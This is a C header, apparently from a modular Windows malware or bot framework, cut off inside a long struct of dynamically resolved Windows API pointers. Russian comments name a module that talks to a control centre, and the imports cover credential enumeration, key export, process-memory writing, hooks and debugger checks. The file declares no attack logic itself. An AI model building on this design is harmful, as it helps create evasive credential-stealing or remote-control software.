#ifndef __ZMODULE_ZMODULE_H_
#define __ZMODULE_ZMODULE_H_

#include "windows.h"
#include "functions.h"
#include "dynfuncs.h"
#include "runtime.h"
#include "native.h"
#include "memory.h"
#include "string.h"
#include "logger.h"
#include "utils.h"
#include "vector.h"
#include "async.h"
#include "net.h"
#include "privilege.h"
#include "wmi.h"
#include "win32stream.h"
#include "win32service.h"
#include "lzma.h"

#include "zmodule_defs.h"
#include "hipses.h"

#include "httpclient.h"

#include "crypto\rsa.h"
#include "crypto\arc4.h"
#include "crypto\crc64.h"

#define OS_WINDOWS  0x01000000
#define OS_MACOS    0x02000000
#define OS_LINUX    0x04000000
#define OS_ANDROID  0x08000000
#define OS_IOS      0x10000000

typedef struct _system_info
{
    uint32_t osMajorVer;        // Major version of system
    uint32_t osMinorVer;        // Minor version of system
    uint32_t osSp;              // Service pack version
    uint32_t osBuildNumber;     // Build number
    uint32_t osProductType;     // Product type (Workstation, Server, ...)
    uint32_t osValue;           // Complex value for server
    uint32_t osLangId;          // System language ID.
    int isWow64;
} system_info_t, *psystem_info_t;


#define MODULE_COMMON 0x00000001            // основной модуль (доступ к VFS)
#define MODULE_CONTROLLER 0x00000002        // модуль через который осуществляется взаимодействие с центром управления.
#define MODULE_ZMODULE_INVOKER 0x00000004   // модуль, цель которого только запустить указанный zmodule.

struct _zmodule_block
{
    // ntdll.dll
	FnNtCurrentTeb fnNtCurrentTeb;
    FnRtlRandomEx fnRtlRandomEx;
    FnRtlMoveMemory fnRtlMoveMemory;
    FnRtlCompareMemory fnRtlCompareMemory;
    FnZwMapViewOfSection fnZwMapViewOfSection;
    FnNtQuerySystemInformation fnNtQuerySystemInformation;
    FnZwUnmapViewOfSection fnZwUnmapViewOfSection;
    FnLdrUnloadDll fnLdrUnloadDll;
    FnLdrLoadDll fnLdrLoadDll;
    FnNtClose fnNtClose;
    FnRtlGetLastWin32Error fnRtlGetLastWin32Error;
    FnRtlImageDirectoryEntryToData fnRtlImageDirectoryEntryToData;
    FnRtlAddVectoredExceptionHandler fnRtlAddVectoredExceptionHandler;
    FnRtlRemoveVectoredExceptionHandler fnRtlRemoveVectoredExceptionHandler;
    FnZwOpenSection fnZwOpenSection;
    FnRtlInitUnicodeString fnRtlInitUnicodeString;
    Fntowlower fntowlower;
    Fn_allmul fn_allmul;
    Fn_allshr fn_allshr;
    Fn_aulldiv fn_aulldiv;
    Fn_aullrem fn_aullrem;
    FnRtlImageNtHeader fnRtlImageNtHeader;
	FnRtlIpv4AddressToStringW fnRtlIpv4AddressToStringW;
	FnRtlIpv6AddressToStringW fnRtlIpv6AddressToStringW;
	FnZwOpenSymbolicLinkObject fnZwOpenSymbolicLinkObject;
	FnZwQuerySymbolicLinkObject fnZwQuerySymbolicLinkObject;
	FnNtCreateKey fnNtCreateKey;
	FnNtOpenKey fnNtOpenKey;
	FnNtQueryValueKey fnNtQueryValueKey;
	FnNtOpenProcessToken fnNtOpenProcessToken;
	FnNtQueryInformationToken fnNtQueryInformationToken;
	FnRtlConvertSidToUnicodeString fnRtlConvertSidToUnicodeString;
	FnZwOpenProcess fnZwOpenProcess;
	FnNtQueryInformationProcess fnNtQueryInformationProcess;
	FnZwTerminateProcess fnZwTerminateProcess;
	FnNtEnumerateKey fnNtEnumerateKey;
	FnZwEnumerateValueKey fnZwEnumerateValueKey;
	FnRtlDosPathNameToNtPathName_U fnRtlDosPathNameToNtPathName_U;
	FnRtlCreateHeap fnRtlCreateHeap;
	FnRtlAllocateHeap fnRtlAllocateHeap;
	FnRtlReAllocateHeap fnRtlReAllocateHeap;
	FnRtlFreeHeap fnRtlFreeHeap;
	FnNtCreateFile fnNtCreateFile;
	FnNtQueryDirectoryFile fnNtQueryDirectoryFile;
	FnNtWaitForSingleObject fnNtWaitForSingleObject;
	FnRtlSubAuthoritySid fnRtlSubAuthoritySid;
	FnNtSetValueKey fnNtSetValueKey;
	FnNtSetInformationFile fnNtSetInformationFile;
	FnNtQueryFullAttributesFile fnNtQueryFullAttributesFile;
	FnNtReadVirtualMemory fnNtReadVirtualMemory;
	FnRtlGetVersion fnRtlGetVersion;
    FnNtDeleteValueKey fnNtDeleteValueKey;
    FnRtlNtStatusToDosError fnRtlNtStatusToDosError;
    FnNtDeviceIoControlFile fnNtDeviceIoControlFile;
    FnNtQueryInformationFile fnNtQueryInformationFile;
    FnNtQueryVolumeInformationFile fnNtQueryVolumeInformationFile;
    Fn_snprintf fn_snprintf;

    // kernel32.dll
    FnVirtualAlloc fnVirtualAlloc;
    FnGetCurrentProcessId fnGetCurrentProcessId;
    FnVirtualProtect fnVirtualProtect;
    FnExitProcess fnExitProcess;
    FnGetExitCodeProcess fnGetExitCodeProcess;
    FnGetProcAddress fnGetProcAddress;
    FnGetCurrentProcess fnGetCurrentProcess;
    FnCreateThread fnCreateThread;
    FnCloseHandle fnCloseHandle;
    FnCopyFileW fnCopyFileW;
    FnCreateFileW fnCreateFileW;
    FnCreateFileA fnCreateFileA;
    FnGetFileSize fnGetFileSize;
    FnWriteFile fnWriteFile;
    FnCreateFileMappingW fnCreateFileMappingW;
    FnOpenFileMappingA fnOpenFileMappingA;
    FnCreateProcessW fnCreateProcessW;
    FnDeleteFileW fnDeleteFileW;
    FnMoveFileExW fnMoveFileExW;
    FnGetEnvironmentVariableW fnGetEnvironmentVariableW;
    FnGetModuleHandleW fnGetModuleHandleW;
    FnGetThreadContext fnGetThreadContext;
    FnMapViewOfFile fnMapViewOfFile;
    FnReadFile fnReadFile;
    FnResumeThread fnResumeThread;
    FnTerminateProcess fnTerminateProcess;
    FnUnmapViewOfFile fnUnmapViewOfFile;
    FnWaitForSingleObject fnWaitForSingleObject;
    FnVirtualQuery fnVirtualQuery;
    FnVirtualFree fnVirtualFree;
    FnIsWow64Process fnIsWow64Process;
    FnWow64DisableWow64FsRedirection fnWow64DisableWow64FsRedirection;
    FnWow64RevertWow64FsRedirection fnWow64RevertWow64FsRedirection;
    FnLoadLibraryW fnLoadLibraryW;
    FnLoadLibraryA fnLoadLibraryA;
    FnLoadLibraryExA fnLoadLibraryExA;
    FnSleepEx fnSleepEx;
    FnTerminateThread fnTerminateThread;
    FnCreateEventW fnCreateEventW;
    FnCreateEventA fnCreateEventA;
    FnResetEvent fnResetEvent;
    FnSetEvent fnSetEvent;
    FnSuspendThread fnSuspendThread;
    FnCreateToolhelp32Snapshot fnCreateToolhelp32Snapshot;
    FnDeviceIoControl fnDeviceIoControl;
    FnFindClose fnFindClose;
    FnFindFirstFileW fnFindFirstFileW;
    FnFindNextFileW fnFindNextFileW;
    FnGetCurrentThreadId fnGetCurrentThreadId;
    FnGetLastError fnGetLastError;
	FnSetLastError fnSetLastError;
    FnGetModuleFileNameA fnGetModuleFileNameA;
    FnProcess32FirstW fnProcess32FirstW;
	FnProcess32NextW fnProcess32NextW;
    FnlstrlenW fnlstrlenW;
    FnlstrlenA fnlstrlenA;
    FnlstrcatW fnlstrcatW;
    FnlstrcatA fnlstrcatA;
    FnlstrcmpiW fnlstrcmpiW;
    FnlstrcmpiA fnlstrcmpiA;
    FnlstrcpyW fnlstrcpyW;
    FnlstrcpyA fnlstrcpyA;
    FnSetFilePointer fnSetFilePointer;
    FnCreateSemaphoreW fnCreateSemaphoreW;
    FnFreeLibrary fnFreeLibrary;
    FnGetACP fnGetACP;
    FnGetCurrentThread fnGetCurrentThread;
    FnSetThreadAffinityMask fnSetThreadAffinityMask;
    FnSetPriorityClass fnSetPriorityClass;
    FnGetSystemInfo fnGetSystemInfo;
    FnGetTempPathW fnGetTempPathW;
    FnGetLongPathNameW fnGetLongPathNameW;
    FnGetTempFileNameW fnGetTempFileNameW;
    FnSleep fnSleep;
    FnLoadLibraryExW fnLoadLibraryExW;
    FnDuplicateHandle fnDuplicateHandle;
    FnCreateFileMappingA fnCreateFileMappingA;
    FnGetSystemDirectoryW fnGetSystemDirectoryW;
    FnExitThread fnExitThread;
    FnGetTickCount fnGetTickCount;
    FnlstrcpynA fnlstrcpynA;
    FnlstrcpynW fnlstrcpynW;
    FnWriteProcessMemory fnWriteProcessMemory;
    FnReadProcessMemory fnReadProcessMemory;
    FnOpenEventA fnOpenEventA;
    FnRemoveDirectoryW fnRemoveDirectoryW;
    // FnInitializeCriticalSection fnInitializeCriticalSection;
    // FnEnterCriticalSection fnEnterCriticalSection;
    // FnLeaveCriticalSection fnLeaveCriticalSection;
    // FnDeleteCriticalSection fnDeleteCriticalSection;
    FnCreateDirectoryW fnCreateDirectoryW;
    FnFlushViewOfFile fnFlushViewOfFile;
    FnGetModuleFileNameW fnGetModuleFileNameW;
    FnGetLocalTime fnGetLocalTime;
    FnSystemTimeToFileTime fnSystemTimeToFileTime;
    FnlstrcmpA fnlstrcmpA;
    FnFlushInstructionCache fnFlushInstructionCache;
    FnGetProcessHeap fnGetProcessHeap;
    FnHeapAlloc fnHeapAlloc;
    FnHeapReAlloc fnHeapReAlloc;
    FnHeapFree fnHeapFree;
    FnSetEndOfFile fnSetEndOfFile;
    FnVirtualQueryEx fnVirtualQueryEx;
    FnOpenProcess fnOpenProcess;
    FnOpenMutexA fnOpenMutexA;
    FnCreateMutexA fnCreateMutexA;
	FnReleaseMutex fnReleaseMutex;
    FnMultiByteToWideChar fnMultiByteToWideChar;
    FnGetDateFormatA fnGetDateFormatA;
    FnGetTimeFormatA fnGetTimeFormatA;
    FnOutputDebugStringA fnOutputDebugStringA;
    FnGetExitCodeThread fnGetExitCodeThread;
    FnGetWindowsDirectoryW fnGetWindowsDirectoryW;
    FnLockFileEx fnLockFileEx;
    FnUnlockFileEx fnUnlockFileEx;
    FnGlobalFree fnGlobalFree;
    FnGetLocaleInfoW fnGetLocaleInfoW;
    FnGetCurrentDirectoryW fnGetCurrentDirectoryW;
    FnSetCurrentDirectoryW fnSetCurrentDirectoryW;
    FnInitializeCriticalSection fnInitializeCriticalSection;
    FnEnterCriticalSection fnEnterCriticalSection;
    FnTryEnterCriticalSection fnTryEnterCriticalSection;
    FnLeaveCriticalSection fnLeaveCriticalSection;
    FnDeleteCriticalSection fnDeleteCriticalSection;
    FnGetStringTypeW fnGetStringTypeW;
    FnTlsSetValue fnTlsSetValue;
    FnTlsGetValue fnTlsGetValue;
    FnTlsAlloc fnTlsAlloc;
    FnTlsFree fnTlsFree;
    FnSetThreadPriority fnSetThreadPriority;
    FnOutputDebugStringW fnOutputDebugStringW;
    FnlstrcmpW fnlstrcmpW;
    FnIsDebuggerPresent fnIsDebuggerPresent;
    FnGetLogicalDriveStringsW fnGetLogicalDriveStringsW;
    FnGetDriveTypeW fnGetDriveTypeW;
    FnGetFileAttributesW fnGetFileAttributesW;
    FnHeapCreate fnHeapCreate;
    FnHeapDestroy fnHeapDestroy;
    FnHeapSize fnHeapSize;
    FnGlobalLock fnGlobalLock;
    FnGlobalUnlock fnGlobalUnlock;
    FnLocalFree fnLocalFree;
    FnExpandEnvironmentStringsW fnExpandEnvironmentStringsW;
    FnGetPrivateProfileStringW fnGetPrivateProfileStringW;
    FnGetPrivateProfileSectionNamesW fnGetPrivateProfileSectionNamesW;
    FnGetPrivateProfileIntW fnGetPrivateProfileIntW;
    FnWideCharToMultiByte fnWideCharToMultiByte;
    FnQueryPerformanceCounter fnQueryPerformanceCounter;
	FnQueryPerformanceFrequency fnQueryPerformanceFrequency;
    FnGetFullPathNameW fnGetFullPathNameW;
    FnFlushFileBuffers fnFlushFileBuffers;
    FnGetSystemTime fnGetSystemTime;
    FnAreFileApisANSI fnAreFileApisANSI;
    FnGetFileAttributesExW fnGetFileAttributesExW;
    FnGetLocaleInfoA fnGetLocaleInfoA;
    FnWTSGetActiveConsoleSessionId fnWTSGetActiveConsoleSessionId;
    FnProcessIdToSessionId fnProcessIdToSessionId;
    FnSetFileAttributesW fnSetFileAttributesW;
	FnGetDateFormatEx fnGetDateFormatEx;
	FnMulDiv fnMulDiv;
	FnSwitchToThread fnSwitchToThread;
    FnSetErrorMode fnSetErrorMode;
    FnCreateIoCompletionPort fnCreateIoCompletionPort;
    FnGetQueuedCompletionStatus fnGetQueuedCompletionStatus;
    FnGetQueuedCompletionStatusEx fnGetQueuedCompletionStatusEx;
    FnSetFileCompletionNotificationModes fnSetFileCompletionNotificationModes;
    FnCreateSymbolicLinkW fnCreateSymbolicLinkW;
    FnCancelIoEx fnCancelIoEx;
    FnInitializeSRWLock fnInitializeSRWLock;
    FnAcquireSRWLockShared fnAcquireSRWLockShared;
    FnAcquireSRWLockExclusive fnAcquireSRWLockExclusive;
    FnTryAcquireSRWLockShared fnTryAcquireSRWLockShared;
    FnTryAcquireSRWLockExclusive fnTryAcquireSRWLockExclusive;
    FnReleaseSRWLockShared fnReleaseSRWLockShared;
    FnReleaseSRWLockExclusive fnReleaseSRWLockExclusive;
    FnInitializeConditionVariable fnInitializeConditionVariable;
    FnSleepConditionVariableCS fnSleepConditionVariableCS;
    FnSleepConditionVariableSRW fnSleepConditionVariableSRW;
    FnWakeAllConditionVariable fnWakeAllConditionVariable;
    FnWakeConditionVariable fnWakeConditionVariable;
    FnGetFileInformationByHandle fnGetFileInformationByHandle;
    FnReadDirectoryChangesW fnReadDirectoryChangesW;
    FnGetShortPathNameW fnGetShortPathNameW;
    FnGetFileType fnGetFileType;
    FnQueueUserWorkItem fnQueueUserWorkItem;
    FnSetHandleInformation fnSetHandleInformation;
    FnPostQueuedCompletionStatus fnPostQueuedCompletionStatus;
    FnCancelIo fnCancelIo;
    FnWaitForMultipleObjects fnWaitForMultipleObjects;
    FnCreateNamedPipeA fnCreateNamedPipeA;
    FnSetNamedPipeHandleState fnSetNamedPipeHandleState;
    FnCreateNamedPipeW fnCreateNamedPipeW;
    FnWaitNamedPipeW fnWaitNamedPipeW;
    FnConnectNamedPipe fnConnectNamedPipe;
    FnRegisterWaitForSingleObject fnRegisterWaitForSingleObject;
    FnUnregisterWait fnUnregisterWait;
    FnGetProcessTimes fnGetProcessTimes;
    FnFileTimeToSystemTime fnFileTimeToSystemTime;
    FnReleaseSemaphore fnReleaseSemaphore;
    FnCreateHardLinkW fnCreateHardLinkW;
    FnGetNamedPipeHandleStateW fnGetNamedPipeHandleStateW;
    FnSetFileTime fnSetFileTime;
    FnSetEnvironmentVariableW fnSetEnvironmentVariableW;
    FnPeekNamedPipe fnPeekNamedPipe;
    FnGlobalMemoryStatusEx fnGlobalMemoryStatusEx;
    FnFormatMessageA fnFormatMessageA;
    FnGetStdHandle fnGetStdHandle;
    FnGetConsoleCursorInfo fnGetConsoleCursorInfo;
    FnSetConsoleCursorInfo fnSetConsoleCursorInfo;
    FnSetConsoleCursorPosition fnSetConsoleCursorPosition;
    FnGetConsoleScreenBufferInfo fnGetConsoleScreenBufferInfo;
    FnWriteConsoleOutputW fnWriteConsoleOutputW;
    FnSetConsoleTextAttribute fnSetConsoleTextAttribute;
    FnWriteConsoleW fnWriteConsoleW;
    FnCancelSynchronousIo fnCancelSynchronousIo;

    // advapi32.dll
    FnRegOpenKeyExA fnRegOpenKeyExA;
    FnRegCloseKey fnRegCloseKey;
    FnRegEnumKeyExW fnRegEnumKeyExW;
    FnRegOpenKeyExW fnRegOpenKeyExW;
    FnRegQueryValueExA fnRegQueryValueExA;
    FnRegQueryValueExW fnRegQueryValueExW;
    FnRegEnumKeyExA fnRegEnumKeyExA; 
    FnConvertStringSidToSidW fnConvertStringSidToSidW; 
    FnAdjustTokenPrivileges fnAdjustTokenPrivileges; 
    FnAllocateAndInitializeSid fnAllocateAndInitializeSid;
    FnEqualSid fnEqualSid; 
    FnFreeSid fnFreeSid;
    FnGetLengthSid fnGetLengthSid;
    FnGetSidSubAuthority fnGetSidSubAuthority;
    FnGetSidSubAuthorityCount fnGetSidSubAuthorityCount;
    FnGetTokenInformation fnGetTokenInformation;
    FnLookupAccountSidA fnLookupAccountSidA;
    FnLookupPrivilegeNameW fnLookupPrivilegeNameW;
    FnLookupPrivilegeValueA fnLookupPrivilegeValueA;
    FnOpenProcessToken fnOpenProcessToken;
	FnOpenThreadToken fnOpenThreadToken;
    FnSetTokenInformation fnSetTokenInformation;
    FnRegCreateKeyExW fnRegCreateKeyExW;
    FnRegDeleteValueW fnRegDeleteValueW;
    FnRegSetValueExW fnRegSetValueExW;
    FnRegOpenKeyW fnRegOpenKeyW;
    FnRegOpenKeyA fnRegOpenKeyA;
    FnRegEnumValueA fnRegEnumValueA;
    FnRevertToSelf fnRevertToSelf;
    FnCredEnumerateA fnCredEnumerateA;
    FnCredEnumerateW fnCredEnumerateW;
    FnCredFree fnCredFree;
    FnIsTextUnicode fnIsTextUnicode;
    FnImpersonateLoggedOnUser fnImpersonateLoggedOnUser;
    FnCryptGetUserKey fnCryptGetUserKey;
    FnCryptExportKey fnCryptExportKey;
    FnCryptDestroyKey fnCryptDestroyKey;
	FnCryptAcquireContextW fnCryptAcquireContextW;
    FnCryptReleaseContext fnCryptReleaseContext;
	FnCryptCreateHash fnCryptCreateHash;
	FnCryptHashData fnCryptHashData;
	FnCryptGetHashParam fnCryptGetHashParam;
	FnCryptDestroyHash fnCryptDestroyHash;
    FnCryptGenRandom fnCryptGenRandom;
    FnRegOpenCurrentUser fnRegOpenCurrentUser;
	FnOpenSCManagerW fnOpenSCManagerW;
    FnCreateServiceW fnCreateServiceW;
    FnChangeServiceConfigW fnChangeServiceConfigW;
	FnEnumServicesStatusW fnEnumServicesStatusW;
	FnCloseServiceHandle fnCloseServiceHandle;
	FnOpenServiceW fnOpenServiceW;
    FnStartServiceW fnStartServiceW;
    FnQueryServiceStatus fnQueryServiceStatus;
	FnQueryServiceConfigW fnQueryServiceConfigW;
	FnI_QueryTagInformation fnI_QueryTagInformation;
    FnStartServiceCtrlDispatcherW fnStartServiceCtrlDispatcherW;
    FnRegisterServiceCtrlHandlerW fnRegisterServiceCtrlHandlerW;
    FnSetServiceStatus fnSetServiceStatus;
	FnGetUserNameW fnGetUserNameW;

    // user32.dll
    FnCreateWindowExW fnCreateWindowExW;
    FnGetWindowRect fnGetWindowRect;
    FnwsprintfW fnwsprintfW;
    FnDefWindowProcW fnDefWindowProcW;
    FnOffsetRect fnOffsetRect;
    FnInflateRect fnInflateRect;
    FnUnionRect fnUnionRect;
    FnSetCursor fnSetCursor;
    FnLoadCursorW fnLoadCursorW;
    FnGetWindowLongW fnGetWindowLongW;
    FnSetWindowLongW fnSetWindowLongW;
    FnEnumDisplayMonitors fnEnumDisplayMonitors;
    FnGetKeyState fnGetKeyState;
    FnGetDC fnGetDC;
    FnReleaseDC fnReleaseDC;
    FnDestroyWindow fnDestroyWindow;
    FnIsWindow fnIsWindow;
    FnSetTimer fnSetTimer;
    FnKillTimer fnKillTimer;
    FnGetClientRect fnGetClientRect;
    FnGetWindow fnGetWindow;
    FnSetWindowPos fnSetWindowPos;
    FnSetLayeredWindowAttributes fnSetLayeredWindowAttributes;
    FnGetCursorPos fnGetCursorPos;
    FnScreenToClient fnScreenToClient;
    FnSendMessageW fnSendMessageW;
    FnMapWindowPoints fnMapWindowPoints;
    FnInvalidateRect fnInvalidateRect;
    FnSetCapture fnSetCapture;
    FnReleaseCapture fnReleaseCapture;
    FnBeginPaint fnBeginPaint;
    FnEndPaint fnEndPaint;
    FnIsRectEmpty fnIsRectEmpty;
    FnGetUpdateRect fnGetUpdateRect;
    FnSetFocus fnSetFocus;
    FnGetFocus fnGetFocus;
    FnGetMessageW fnGetMessageW;
    FnDispatchMessageW fnDispatchMessageW;
    FnTranslateMessage fnTranslateMessage;
    FnPostMessageW fnPostMessageW;
    FnPtInRect fnPtInRect;
    FnGetParent fnGetParent;
    FnShowWindow fnShowWindow;
    FnEnableWindow fnEnableWindow;
    FnPostQuitMessage fnPostQuitMessage;
    FnSystemParametersInfoW fnSystemParametersInfoW;
    FnLoadImageW fnLoadImageW;
    FnGetSystemMetrics fnGetSystemMetrics;
    FnRegisterClassW fnRegisterClassW;
    FnRegisterClassExW fnRegisterClassExW;
    FnGetClassInfoExW fnGetClassInfoExW;
    FnCallWindowProcW fnCallWindowProcW;
#ifdef _WIN64
    FnSetWindowLongPtrW fnSetWindowLongPtrW;
    FnGetWindowLongPtrW fnGetWindowLongPtrW;
#endif // _WIN64
    FnGetPropW fnGetPropW;
    FnSetPropW fnSetPropW;
    FnAdjustWindowRectEx fnAdjustWindowRectEx;
    FnGetMenu fnGetMenu;
    FnIntersectRect fnIntersectRect;
    FnCharNextW fnCharNextW;
    FnCharPrevW fnCharPrevW;
    FnFillRect fnFillRect;
    FnSetRect fnSetRect;
    FnIsIconic fnIsIconic;
    FnGetMonitorInfoW fnGetMonitorInfoW;
    FnMonitorFromWindow fnMonitorFromWindow;
    FnSetWindowRgn fnSetWindowRgn;
    FnIsZoomed fnIsZoomed;
    FnMessageBoxW fnMessageBoxW;
    FnSetWindowsHookExW fnSetWindowsHookExW;
    FnCallNextHookEx fnCallNextHookEx;
    FnUnhookWindowsHookEx fnUnhookWindowsHookEx;
    FnIsWindowVisible fnIsWindowVisible;
    FnEnumWindows fnEnumWindows;
    FnFindWindowA fnFindWindowA;
    FnFindWindowExA fnFindWindowExA;
    FnDrawTextW fnDrawTextW;
    FnCharUpperW fnCharUpperW;
    FnCharLowerW fnCharLowerW;
    FnwvnsprintfW fnwvnsprintfW;
    FnClientToScreen fnClientToScreen;
    FnSendInput fnSendInput;
    FnSetWindowTextW fnSetWindowTextW;
    FnGetWindowTextW fnGetWindowTextW;
    FnGetWindowTextLengthW fnGetWindowTextLengthW;
    FnAttachThreadInput fnAttachThreadInput;
    FnEnumChildWindows fnEnumChildWindows;
    FnGetClassNameW fnGetClassNameW;
    FnGetWindowThreadProcessId fnGetWindowThreadProcessId;
    FnMapVirtualKeyA fnMapVirtualKeyA;
    FnPostMessageA fnPostMessageA;
    FnwsprintfA fnwsprintfA;
    FnRegisterClassExA fnRegisterClassExA;
    FnCreateWindowExA fnCreateWindowExA;
    FnExitWindowsEx fnExitWindowsEx;
    Fnmouse_event fnmouse_event;
    FnSetWindowLongA fnSetWindowLongA;
    FnGetWindowLongA fnGetWindowLongA;
    FnSetWindowLongPtrA fnSetWindowLongPtrA;
    FnGetWindowLongPtrA fnGetWindowLongPtrA;
    FnSendNotifyMessageA fnSendNotifyMessageA;
    FnMessageBoxA fnMessageBoxA;
	FnCreateIconIndirect fnCreateIconIndirect;
	FnDestroyIcon fnDestroyIcon;
	FnRegisterWindowMessageW fnRegisterWindowMessageW;
	FnGetIconInfo fnGetIconInfo;
	FnDrawIconEx fnDrawIconEx;
	FnMoveWindow fnMoveWindow;
	FnCreateAcceleratorTableW fnCreateAcceleratorTableW;
	FnInvalidateRgn fnInvalidateRgn;
    FnGetForegroundWindow fnGetForegroundWindow;
    FnwvsprintfA fnwvsprintfA;
	FnwvsprintfW fnwvsprintfW;

    // shell32.dll
    FnShellExecuteExW fnShellExecuteExW;
    FnSHCreateItemFromParsingName fnSHCreateItemFromParsingName;
    FnSHGetSpecialFolderPathW fnSHGetSpecialFolderPathW;
    FnStrToInt64ExA fnStrToInt64ExA;
    FnSHGetFolderPathW fnSHGetFolderPathW;
	FnShell_NotifyIconW fnShell_NotifyIconW;
	FnSHGetFileInfoW fnSHGetFileInfoW;
    FnSHGetKnownFolderPath fnSHGetKnownFolderPath;


    // ole32.dll
    FnCoInitialize fnCoInitialize;
    FnOleUninitialize fnOleUninitialize;
    FnCoInitializeEx fnCoInitializeEx;
    FnCoUninitialize fnCoUninitialize;
    FnCoGetObject fnCoGetObject;
    FnCoCreateInstance fnCoCreateInstance;
    FnCreateStreamOnHGlobal fnCreateStreamOnHGlobal;
    FnGetRunningObjectTable fnGetRunningObjectTable;
    FnCreateItemMoniker fnCreateItemMoniker;
    FnCoTaskMemFree fnCoTaskMemFree;
    FnIsEqualGUID fnIsEqualGUID;
    FnGetHGlobalFromStream fnGetHGlobalFromStream;
    FnStgOpenStorage fnStgOpenStorage;
    FnOleInitialize fnOleInitialize;
	FnCoInitializeSecurity fnCoInitializeSecurity;
	FnCoSetProxyBlanket fnCoSetProxyBlanket;
	FnCLSIDFromString fnCLSIDFromString;
	FnCLSIDFromProgID fnCLSIDFromProgID;
	FnOleLockRunning fnOleLockRunning;

    // oleaut32.dll
    FnSysAllocString fnSysAllocString;
    FnSysFreeString fnSysFreeString;
    FnVariantInit fnVariantInit;
    FnVariantChangeType fnVariantChangeType;
    FnVariantClear fnVariantClear;

    // shlwapi.dll
    FnPathCombineW fnPathCombineW;
    FnPathAppendW fnPathAppendW;
    FnPathRemoveFileSpecW fnPathRemoveFileSpecW;
    FnPathFindFileNameA fnPathFindFileNameA;
    FnPathFindFileNameW fnPathFindFileNameW;
    FnStrToIntW fnStrToIntW;
    FnStrStrIW fnStrStrIW;
    FnwnsprintfW fnwnsprintfW;
    FnStrChrA fnStrChrA;
    FnStrStrIA fnStrStrIA;
    FnStrStrA fnStrStrA;
    FnStrStrW fnStrStrW;
    FnStrCmpNIA fnStrCmpNIA;
    FnStrRChrIW fnStrRChrIW;
    FnStrToIntA fnStrToIntA;
    FnStrCmpIW fnStrCmpIW;
    FnStrCmpNIW fnStrCmpNIW;
    FnStrCmpNW fnStrCmpNW;

	// Iphlpapi.dll
	FnGetExtendedTcpTable fnGetExtendedTcpTable;
	FnGetExtendedUdpTable fnGetExtendedUdpTable;

    // psapi.dll
    FnEnumProcessModules fnEnumProcessModules;
	FnGetProcessImageFileNameW fnGetProcessImageFileNameW;
	FnGetModuleFileNameExW fnGetModuleFileNameExW;
	FnGetModuleBaseNameW fnGetModuleBaseNameW;
	FnGetProcessMemoryInfo fnGetProcessMemoryInfo;

    // imagehlp.dll
    FnCheckSumMappedFile fnCheckSumMappedFile;

    // urlmon.dll
    FnObtainUserAgentString fnObtainUserAgentString;

	// version.dll
	FnGetFileVersionInfoSizeW fnGetFileVersionInfoSizeW;
	FnGetFileVersionInfoW fnGetFileVersionInfoW;
	FnVerQueryValueW fnVerQueryValueW;

    // gdi32.dll
    FnGetObjectW fnGetObjectW;
    FnGetObjectA fnGetObjectA;
    FnGetStockObject fnGetStockObject;
    FnCreateFontIndirectW fnCreateFontIndirectW;
    FnCreatePen fnCreatePen;
    FnSelectObject fnSelectObject;
    FnDeleteObject fnDeleteObject;
    FnDeleteDC fnDeleteDC;
    FnSaveDC fnSaveDC;
    FnRestoreDC fnRestoreDC;
    FnSetWindowOrgEx fnSetWindowOrgEx;
    FnRectangle fnRectangle;
    FnBitBlt fnBitBlt;
    FnCreateCompatibleBitmap fnCreateCompatibleBitmap;
    FnCreateCompatibleDC fnCreateCompatibleDC;
    FnGetTextMetricsW fnGetTextMetricsW;
    FnSelectClipRgn fnSelectClipRgn;
    FnGetObjectType fnGetObjectType;
    FnExtSelectClipRgn fnExtSelectClipRgn;
    FnCreateRectRgnIndirect fnCreateRectRgnIndirect;
    FnGetClipBox fnGetClipBox;
    FnCombineRgn fnCombineRgn;
    FnCreateRoundRectRgn fnCreateRoundRectRgn;
    FnCreateSolidBrush fnCreateSolidBrush;
    FnCreateDIBSection fnCreateDIBSection;
    FnStretchBlt fnStretchBlt;
    FnMoveToEx fnMoveToEx;
    FnLineTo fnLineTo;
    FnCreatePenIndirect fnCreatePenIndirect;
    FnRoundRect fnRoundRect;
    FnSetTextColor fnSetTextColor;
    FnSetBkMode fnSetBkMode;
    FnTextOutW fnTextOutW;
    FnGetTextExtentPoint32W fnGetTextExtentPoint32W;
    FnGetCharABCWidthsW fnGetCharABCWidthsW;
    FnSetBkColor fnSetBkColor;
    FnGdiFlush fnGdiFlush;
    FnSetStretchBltMode fnSetStretchBltMode;
    FnExtTextOutW fnExtTextOutW;
	FnGetPixel fnGetPixel;
	FnSetPixel fnSetPixel;
	FnGetDeviceCaps fnGetDeviceCaps;

    // comctl32.dll
	FnInitCommonControlsEx fnInitCommonControlsEx;
    Fn_TrackMouseEvent fn_TrackMouseEvent;

    // winmm.dll
    FntimeGetTime fntimeGetTime;

    //msimg32.dll
    FnAlphaBlend fnAlphaBlend;
    FnGradientFill fnGradientFill;

    // winhttp.dll
    FnWinHttpCloseHandle fnWinHttpCloseHandle;
    FnWinHttpConnect fnWinHttpConnect;
    FnWinHttpOpen fnWinHttpOpen;
    FnWinHttpCrackUrl fnWinHttpCrackUrl;
    FnWinHttpOpenRequest fnWinHttpOpenRequest;
    FnWinHttpQueryHeaders fnWinHttpQueryHeaders;
    FnWinHttpReceiveResponse fnWinHttpReceiveResponse;
    FnWinHttpSendRequest fnWinHttpSendRequest;
    FnWinHttpSetOption fnWinHttpSetOption;
    FnWinHttpSetTimeouts fnWinHttpSetTimeouts;
    FnWinHttpQueryDataAvailable fnWinHttpQueryDataAvailable;
    FnWinHttpReadData fnWinHttpReadData;
    FnWinHttpWriteData fnWinHttpWriteData;
    FnWinHttpAddRequestHeaders fnWinHttpAddRequestHeaders;
    FnWinHttpGetIEProxyConfigForCurrentUser fnWinHttpGetIEProxyConfigForCurrentUser;
    FnWinHttpGetProxyForUrl fnWinHttpGetProxyForUrl;

    // ws2_32.dll
    FnWSAStartup fnWSAStartup;
    FnWSACleanup fnWSACleanup;
    Fngetaddrinfo fngetaddrinfo;
    Fnfreeaddrinfo fnfreeaddrinfo;
    FnWSAGetLastError fnWSAGetLastError;
    Fnsocket fnsocket;
    Fngethostbyname fngethostbyname;
    Fnsetsockopt fnsetsockopt;
    Fngetsockopt fngetsockopt;
    Fnhtons fnhtons;
    Fnselect fnselect;
    Fnconnect fnconnect;
    Fnntohl fnntohl;
    Fnioctlsocket fnioctlsocket;
    Fnclosesocket fnclosesocket;
    Fnshutdown fnshutdown;
    Fnsend fnsend;
    Fnrecv fnrecv;
    Fninet_addr fninet_addr;
    Fn__WSAFDIsSet fn__WSAFDIsSet;
    FnWSAIoctl fnWSAIoctl;
